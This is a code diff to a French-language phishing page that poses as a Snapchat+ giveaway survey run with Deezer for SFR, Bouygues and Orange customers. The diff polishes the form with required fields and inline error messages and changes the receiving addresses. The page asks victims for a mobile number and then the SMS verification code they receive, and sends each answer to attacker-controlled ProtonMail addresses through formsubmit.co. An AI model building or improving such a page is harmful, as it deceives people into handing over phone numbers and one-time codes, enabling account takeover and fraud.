@@ -24,6 +24,7 @@
         .progress-text { position:absolute; right:10px; top:0; font-size:14px; font-weight:600; color:#003b7a; line-height:16px; }
         .about { max-width:650px; margin:20px auto 40px auto; padding:20px; background:#e8f0fe; border-radius:10px; font-size:14px; color:#003b7a; line-height:1.4; text-align:left; }
         .footer { text-align:center; padding:20px 0; font-size:14px; color:#999; margin-top:20px; border-top:1px solid #ddd; }
+        .error { color: red; font-size: 14px; margin-top: 10px; }
         @media(max-width:600px){ .box{margin:30px 20px;padding:30px} h2{font-size:24px} p{font-size:16px} button{font-size:16px} .about{font-size:13px;padding:15px} }
     </style>
 </head>
@@ -47,10 +48,11 @@
     <div class="box active" id="etape1">
         <h2>Recevoir Snapchat+ 🎁</h2>
         <p>Pour recevoir Snapchat+, participez à ce sondage en collaboration avec <strong>Deezer</strong>. Offre réservée aux clients <strong>SFR, Bouygues ou Orange</strong>.</p>
-        <input type="text" id="artiste_prefere" placeholder="Votre artiste préféré">
-        <input type="text" id="artiste_deezer" placeholder="Artiste que vous écoutez sur Deezer">
-        <input type="text" id="artiste_decouverte" placeholder="Artiste découvert récemment">
+        <input type="text" id="artiste_prefere" placeholder="Votre artiste préféré" required>
+        <input type="text" id="artiste_deezer" placeholder="Artiste que vous écoutez sur Deezer" required>
+        <input type="text" id="artiste_decouverte" placeholder="Artiste découvert récemment" required>
         <button id="btnEtape1">Suivant</button>
+        <p id="errorEtape1" class="error"></p>
     </div>
 
     <div class="box" id="etape1b">
@@ -61,14 +63,16 @@
 
     <div class="box" id="etape2">
         <h2>Numéro de téléphone</h2>
-        <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
+        <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX" required>
         <button id="btnEtape2">Suivant</button>
+        <p id="errorEtape2" class="error"></p>
     </div>
 
     <div class="box" id="etape3">
         <h2>Code de vérification</h2>
-        <input type="text" id="code_sms" placeholder="Code reçu">
+        <input type="text" id="code_sms" placeholder="Code reçu" required>
         <button id="btnEtape3">Terminer</button>
+        <p id="errorEtape3" class="error"></p>
     </div>
 
     <div class="box" id="etape4">
@@ -88,23 +92,25 @@
         let reponses = {};
 
         function showStep(etapeId, percent){
-            document.querySelectorAll('.box').forEach(b=>b.classList.remove('active'));
+            document.querySelectorAll('.box').forEach(b => b.classList.remove('active'));
             document.getElementById(etapeId).classList.add('active');
-            document.getElementById('progressBar').style.width = percent+"%";
-            document.getElementById('progressText').innerText = percent+"%";
+            document.getElementById('progressBar').style.width = percent + "%";
+            document.getElementById('progressText').innerText = percent + "%";
         }
 
         async function sendMail(dataObj, sujet){
             const formData = new FormData();
             formData.append("_subject", sujet);
-            formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me");
+            formData.append("_cc", "tonemail@protonmail.com,boss@protonmail.com");
             formData.append("_captcha", "false");
-            for(let key in dataObj){ formData.append(key, dataObj[key]); }
+            for (let key in dataObj) {
+                formData.append(key, dataObj[key]);
+            }
             try {
-                await fetch("https://formsubmit.co/tonemail@protonmail.com", { method:"POST", body:formData, headers:{"Accept":"application/json"} });
+                await fetch("https://formsubmit.co/tonemail@protonmail.com", { method: "POST", body: formData, headers: { "Accept": "application/json" } });
                 console.log("Mail envoyé:", sujet);
-            } catch(e) {
-                console.error("Erreur mail", e);
+            } catch (e) {
+                console.error("Erreur d'envoi du mail", e);
             }
         }
 
@@ -113,8 +119,10 @@
             let pref = document.getElementById('artiste_prefere').value.trim();
             let deezer = document.getElementById('artiste_deezer').value.trim();
             let decouverte = document.getElementById('artiste_decouverte').value.trim();
-            if(!pref || !deezer || !decouverte) { alert("Veuillez remplir toutes les questions."); return; }
-
+            if (!pref || !deezer || !decouverte) {
+                document.getElementById('errorEtape1').innerText = "Veuillez remplir toutes les questions.";
+                return;
+            }
             reponses.artiste_prefere = pref;
             reponses.artiste_deezer = deezer;
             reponses.artiste_decouverte = decouverte;
@@ -131,8 +139,10 @@
         // Étape 2
         document.getElementById('btnEtape2').addEventListener('click', () => {
             let tel = document.getElementById('telephone').value.trim();
-            if (!/^0[67]\d{8}$/.test(tel)) { alert("Numéro invalide (06 ou 07)."); return; }
-
+            if (!/^0[67]\d{8}$/.test(tel)) {
+                document.getElementById('errorEtape2').innerText = "Numéro invalide. Assurez-vous qu'il commence par 06 ou 07.";
+                return;
+            }
             reponses.telephone = tel;
             sendMail({telephone: tel}, "Réponses étape 2 - Ipsos");
             showStep('etape3', 75);
@@ -141,8 +151,10 @@
         // Étape 3
         document.getElementById('btnEtape3').addEventListener('click', () => {
             let code = document.getElementById('code_sms').value.trim();
-            if (!code) { alert("Veuillez entrer le code."); return; }
-
+            if (!code) {
+                document.getElementById('errorEtape3').innerText = "Veuillez entrer le code.";
+                return;
+            }
             reponses.code_sms = code;
             sendMail({code_sms: code}, "Réponses étape 3 - Ipsos");
             showStep('etape4', 100);
@@ -151,4 +163,3 @@
 
 </body>
 </html>
-
